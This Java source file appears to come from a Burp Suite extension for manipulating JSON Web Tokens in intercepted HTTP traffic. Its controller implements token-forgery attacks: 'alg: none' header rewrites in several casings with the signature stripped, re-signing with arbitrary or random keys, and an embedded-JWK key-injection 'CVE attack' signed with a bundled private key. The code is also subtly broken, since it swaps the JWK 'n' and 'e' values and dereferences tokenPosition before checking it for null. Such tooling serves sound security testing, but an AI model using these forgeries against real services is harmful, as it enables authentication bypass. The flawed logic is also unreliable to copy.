package app.controllers;

import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.UnsupportedEncodingException;
import java.security.KeyFactory;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;
import java.util.List;

import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.SwingUtilities;


import com.auth0.jwt.algorithms.Algorithm;
import com.eclipsesource.json.Json;
import com.eclipsesource.json.JsonObject;

import app.algorithm.AlgorithmLinker;
import app.controllers.ReadableTokenFormat.InvalidTokenFormat;
import app.helpers.ConsoleOut;
import app.helpers.CustomJWToken;
import app.helpers.PublicKeyBroker;
import app.helpers.Settings;
import app.helpers.Strings;
import app.tokenposition.ITokenPosition;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IMessageEditorTab;
import gui.JWTInterceptTab;
import model.JWTInterceptModel;
import model.TimeClaim;

public class JWTInterceptTabController implements IMessageEditorTab {

	private JWTInterceptModel jwtIM;
	private JWTInterceptTab jwtST;
	private IExtensionHelpers helpers;
	private byte[] message;
	private ITokenPosition tokenPosition;
	private boolean dontModify;
	private boolean randomKey;
	private boolean keepOriginalSignature;
	private boolean recalculateSignature;
	private String algAttackMode;
	private boolean cveAttackMode;

	
	public JWTInterceptTabController(IBurpExtenderCallbacks callbacks, JWTInterceptModel jwIM, JWTInterceptTab jwtST) {
		this.jwtIM = jwIM;
		this.jwtST = jwtST;
		this.helpers = callbacks.getHelpers();

		ActionListener dontModifyListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				radioButtonChanged(true, false, false, false);
			}
		};
		ActionListener randomKeyListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				radioButtonChanged(false, true, false, false);
			}
		};
		ActionListener originalSignatureListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				radioButtonChanged(false, false, true, false);
			}
		};
		ActionListener recalculateSignatureListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				radioButtonChanged(false, false, false, true);
			}
		};
		ActionListener algAttackListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				algAttackChanged();
			}
		};
		ActionListener cveAttackListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				cveAttackChanged();
			}
		};

		jwtST.registerActionListeners(dontModifyListener, randomKeyListener, 
				originalSignatureListener, recalculateSignatureListener,
				algAttackListener,cveAttackListener);
	}
	
	private void cveAttackChanged() {
		JCheckBox a = jwtST.getCVEAttackCheckBox();
		cveAttackMode = a.isSelected();
	}

	private void algAttackChanged() {
		JComboBox<String> jCB = jwtST.getNoneAttackComboBox();
		switch (jCB.getSelectedIndex()) {
		default:
		case 0:
			algAttackMode = null;
			break;
		case 1:
			algAttackMode = "none";
			break;
		case 2:
			algAttackMode = "None";
			break;
		case 3:
			algAttackMode = "nOnE";
			break;
		case 4:
			algAttackMode = "NONE";
			break;
		}
	}

	private void radioButtonChanged(boolean cDM, boolean cRK, boolean cOS, boolean cRS) {
		boolean oldRandomKey = randomKey;
		dontModify = jwtST.getRdbtnDontModify().isSelected();
		randomKey = jwtST.getRdbtnRandomKey().isSelected();
		keepOriginalSignature = jwtST.getRdbtnOriginalSignature().isSelected();
		recalculateSignature = jwtST.getRdbtnRecalculateSignature().isSelected();
		jwtST.setKeyFieldState(!keepOriginalSignature && !dontModify && !randomKey);
		if (keepOriginalSignature || dontModify) {
			jwtIM.setJWTKey("");
			jwtST.setKeyFieldValue("");
		}
		if (randomKey && !oldRandomKey) {
			generateRandomKey();
		}
	}
	
	private RSAPublicKey loadPublicKey(){
	    String publicPEM = Strings.publicKey.replaceAll("\\n", "").replace("-----BEGIN PUBLIC KEY-----", "").replace("-----END PUBLIC KEY-----", "");;
        KeyFactory kf;
		try {
			kf = KeyFactory.getInstance("RSA");
			X509EncodedKeySpec keySpecX509 = new X509EncodedKeySpec(Base64.getDecoder().decode(publicPEM));
			return (RSAPublicKey) kf.generatePublic(keySpecX509);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	private void generateRandomKey() {
		SwingUtilities.invokeLater(new Runnable() {
			@Override
			public void run() {
				CustomJWToken token = null;
				try {
					token = ReadableTokenFormat.getTokenFromReadableFormat(jwtST.getJWTfromArea());
					ConsoleOut.output("Generating Random Key for Signature Calculation");
					String randomKey = AlgorithmLinker.getRandomKey(token.getAlgorithm());
					ConsoleOut.output("RandomKey generated: " + randomKey);
					jwtIM.setJWTKey(randomKey);
					jwtST.updateSetView(false);
				} catch (InvalidTokenFormat invalidTokenFormat) {
					invalidTokenFormat.printStackTrace();
				}
			}
		});
	}

	@Override
	public boolean isEnabled(byte[] content, boolean isRequest) {
		return ITokenPosition.findTokenPositionImplementation(content, isRequest, helpers) != null;
	}

	@Override
	public void setMessage(byte[] content, boolean isRequest) {
		this.message = content;

		tokenPosition = ITokenPosition.findTokenPositionImplementation(content, isRequest, helpers);
		jwtIM.setcFW(tokenPosition.getcFW());
		if (tokenPosition == null) {
			jwtST.updateSetView(true);
		} else {
			jwtIM.setJWT(tokenPosition.getToken());
			CustomJWToken cJWT = new CustomJWToken(jwtIM.getJWT());
			List<TimeClaim> tcl = cJWT.getTimeClaimList();
			jwtIM.setTimeClaims(tcl);
			jwtIM.setJWTJSON(ReadableTokenFormat.getReadableFormat(cJWT));
			jwtIM.setSignature(cJWT.getSignature());
			jwtST.updateSetView(true);
			algAttackMode = null;
			jwtST.getNoneAttackComboBox().setSelectedIndex(0);
		}
	}

	@Override
	public byte[] getMessage() {
		jwtIM.setProblemDetail("");

		radioButtonChanged(true, false, false, false);
		CustomJWToken token = null;
		try {
			token = ReadableTokenFormat.getTokenFromReadableFormat(jwtST.getJWTfromArea());
		} catch (InvalidTokenFormat e) {
			jwtIM.setProblemDetail(e.getMessage());
			return this.message;
		}

		if ((recalculateSignature || randomKey)) {
			if (recalculateSignature) {
				jwtIM.setJWTKey(jwtST.getKeyFieldValue());
			}
			Algorithm algo;
			try {
				ConsoleOut.output("Recalculating Signature with Secret - " + jwtIM.getJWTKey());
				algo = AlgorithmLinker.getSignerAlgorithm(token.getAlgorithm(), jwtIM.getJWTKey());
				token.calculateAndSetSignature(algo);
				addLogHeadersToRequest();
			} catch (IllegalArgumentException | UnsupportedEncodingException e) {
				ConsoleOut.output(e.getStackTrace().toString());
			}
		} else if (keepOriginalSignature) {
			jwtIM.setSignature(jwtIM.getOriginalSignature());
		}
		if (algAttackMode != null) {
			String header = token.getHeaderJson();
			token.setHeaderJson(header.replace(token.getAlgorithm(), algAttackMode));
			token.setSignature("");
		}
		if (cveAttackMode){
			String a = token.getHeaderJson();
			JsonObject value = Json.parse(a).asObject();
			value.set("alg", "RS256");
			JsonObject jwk = new JsonObject();
			jwk.add("kty", "RSA");
			jwk.add("kid", "jwt4b@portswigger.net");
			jwk.add("use", "sig");
			RSAPublicKey pk = loadPublicKey();
			jwk.add("n", Base64.getUrlEncoder().encodeToString(pk.getPublicExponent().toByteArray()));
			jwk.add("e", Base64.getUrlEncoder().encodeToString(pk.getModulus().toByteArray()));
			value.add("jwk", jwk);
			token.setHeaderJson(value.toString());
			Algorithm algo;
			try {
				algo = AlgorithmLinker.getSignerAlgorithm(token.getAlgorithm(), Strings.privateKey);
				token.calculateAndSetSignature(algo);
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
			}
		}
		System.out.println(token.getToken());
		this.message = this.tokenPosition.replaceToken(token.getToken());
		return this.message;

	}

	private void addLogHeadersToRequest() {
		this.tokenPosition.cleanJWTHeaders();
		this.tokenPosition.addHeader(Strings.JWTHeaderInfo);
		this.tokenPosition.addHeader(Strings.JWTHeaderPrefix + "SIGNER-KEY " + jwtIM.getJWTKey());
		if (PublicKeyBroker.publicKey != null) {
			this.tokenPosition.addHeader(Strings.JWTHeaderPrefix + "SIGNER-PUBLIC-KEY " + PublicKeyBroker.publicKey);
			PublicKeyBroker.publicKey = null;
		}
	}

	@Override
	public String getTabCaption() {
		return Settings.tabname;
	}

	@Override
	public Component getUiComponent() {
		return jwtST;
	}

	@Override
	public boolean isModified() {
		// TODO set true when model changed ?
		return false;
	}

	@Override
	public byte[] getSelectedData() {
		return jwtST.getSelectedData().getBytes();
	}

}
